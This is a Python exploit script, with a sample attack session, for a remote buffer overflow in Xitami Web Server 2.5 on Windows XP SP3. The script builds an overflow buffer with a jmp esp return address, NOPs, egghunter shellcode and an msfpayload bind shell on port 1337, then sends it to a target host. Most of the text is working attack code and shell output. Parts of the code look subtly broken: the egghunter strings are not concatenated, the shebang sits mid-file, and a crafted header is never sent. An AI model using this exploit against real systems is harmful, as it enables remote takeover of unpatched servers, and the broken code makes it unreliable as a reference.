# Exploit Title: Xitami Web Server 2.5 Remote Buffer Overflow (Egghunter)
# Date: June 4, 2011
# Author: Glafkos Charalambous
# Version: 2.5b4
# Tested on: Windows XP SP3 En
# Discovered by: Krystian Kloskowski
#
# root@bt:~/Desktop# python xitami.py 192.168.0.24 80
# [+] Connected
# [+] Sending payload...
# [+] Check Port 1337 for your shell
# root@bt:~/Desktop# telnet 192.168.0.24 1337
# Trying 192.168.0.24...
# Connected to 192.168.0.24.
# Escape character is '^]'.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Xitami>ipconfig
# ipconfig
#
# Windows IP Configuration
#
#
# Ethernet adapter Local Area Connection:
#
#        Connection-specific DNS Suffix  . : 
#        IP Address. . . . . . . . . . . . : 192.168.0.24
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0
#        Default Gateway . . . . . . . . . : 192.168.0.1
#
# C:\Xitami>

from struct import pack

import time
#!/usr/bin/python

import socket
from payload import buf
def shell_attack(target_machine, target_port):

    

    target = target_machine
    port = target_port
    
    egghunt = b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
    b"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    b"w00t" # 4 byte tag
    b"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

    # ./msfpayload windows/shell_bind_tcp lport=1337 exitfunc=process R | ./msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -c 7 -t c
    
    jump = b"\xeb\x22" # short jump

    buffer = b"A" * 72                  
    buffer += b"\xD7\x30\x9D\x7C" # jmp esp (user32.dll) / XP SP3 English
    buffer += jump
    buffer += b"\x90" * 50
    buffer += egghunt
    buffer += b"w00tw00t" # tag
    buffer += buf

    header = (
    'GET / HTTP/1.1\r\n'
    'Host: %s\r\n'
    'If-Modified-Since: pwned, %s\r\n'
    '\r\n') % (target, buf)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        print("[+] Sending payload...")
    # header = bytes(header, 'utf-8')
        s.send(buffer)
        time.sleep(1)
        s.close()
        
    except:
        print("Not connected")
       

    

    